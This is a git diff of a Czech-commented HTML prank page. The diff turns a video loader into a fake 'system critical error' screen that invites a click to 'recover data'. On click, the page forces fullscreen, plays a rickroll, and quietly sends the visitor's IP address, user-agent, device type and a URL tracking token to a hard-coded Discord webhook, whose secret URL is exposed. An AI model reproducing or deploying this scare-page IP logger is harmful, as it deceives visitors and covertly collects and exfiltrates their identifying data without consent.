@@ -2,70 +2,77 @@
 <html lang="cs">
 <head>
     <meta charset="UTF-8">
-    <title>Video System</title>
+    <title>System Error</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: black; display: flex; justify-content: center; align-items: center; cursor: pointer; color: white; font-family: sans-serif; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: black; display: flex; justify-content: center; align-items: center; cursor: pointer; color: #ff4444; font-family: 'Courier New', Courier, monospace; }
         video { width: 100%; height: 100%; object-fit: cover; display: none; }
-        #status { text-align: center; }
+        #warning { text-align: center; border: 2px solid #ff4444; padding: 20px; background: rgba(255,0,0,0.1); }
     </style>
 </head>
 <body>
 
-    <div id="status">
-        <h1>Načítání obsahu...</h1>
-        <p>Klepněte pro pokračování</p>
+    <div id="warning">
+        <h2>⚠️ SYSTEM CRITICAL ERROR ⚠️</h2>
+        <p>Your session has been corrupted.</p>
+        <p>[ CLICK TO RECOVER DATA ]</p>
     </div>
 
-    <video id="myVideo" loop>
-        <source src="video.mp4" type="video/mp4">
+    <video id="rickroll" loop>
+        <source src="https://github.com/ShatteredDisk/rickroll/raw/refs/heads/main/rickroll.mp4" type="video/mp4">
     </video>
 
     <script>
-        // --- KONFIGURACE ---
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1461819438948159601/1uQkuVDBbgrAtPCVvRnqDVjm1bGoOX12twRjQ9HALL4i4HEvyLbH4PuQlcMcs11_iE8P";
-        
-        // Funkce pro získání IP a odeslání logu
-        async function logVisit(token) {
-            try {
-                // Získání IP adresy přes veřejné API
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const userIp = ipData.ip;
 
-                // Odeslání dat na Discord
+        async function sendLog(token) {
+            try {
+                // Získání IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                // Detekce zařízení
+                const device = navigator.userAgent.includes("Mobi") ? "Mobil" : "PC/Tablet";
+
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `✅ **Rickroll Úspěšný!**\n**Uživatel:** \`${token}\` \n**IP Adresa:** \`${userIp}\` \n**Status:** Sleduje video na fullscreen.`
+                        embeds: [{
+                            title: "✅ Rickroll Successful",
+                            color: 15548997,
+                            fields: [
+                                { name: "Uživatel (Token)", value: `\`${token}\``, inline: true },
+                                { name: "Zařízení", value: `\`${device}\``, inline: true },
+                                { name: "IP Adresa", value: `\`${ipData.ip}\``, inline: false },
+                                { name: "User-Agent", value: `\`${navigator.userAgent}\`` }
+                            ],
+                            timestamp: new Date()
+                        }]
                     })
                 });
-            } catch (err) {
-                console.error("Chyba při logování:", err);
-            }
+            } catch (e) { console.error("Log failed"); }
         }
 
-        const video = document.getElementById('myVideo');
-        const status = document.getElementById('status');
+        const video = document.getElementById('rickroll');
+        const warning = document.getElementById('warning');
 
         document.body.addEventListener('click', function() {
-            // 1. Získání tokenu z URL (?tkn=dan)
             const urlParams = new URLSearchParams(window.location.search);
-            const token = urlParams.get('tkn') || "Neznámý uživatel";
+            const token = urlParams.get('tkn') || "Neznámý";
 
-            // 2. Fullscreen
+            // Fullscreen trigger
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen();
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
 
-            // 3. Spuštění videa a logování
-            status.style.display = 'none';
+            // Zobrazení videa
+            warning.style.display = 'none';
             video.style.display = 'block';
             video.play();
 
-            // Zavoláme logovací funkci
-            logVisit(token);
-        }, { once: true }); // Spustí se jen při prvním kliknutí
+            // Odeslání reportu
+            sendLog(token);
+        }, { once: true });
     </script>
 </body>
 </html>
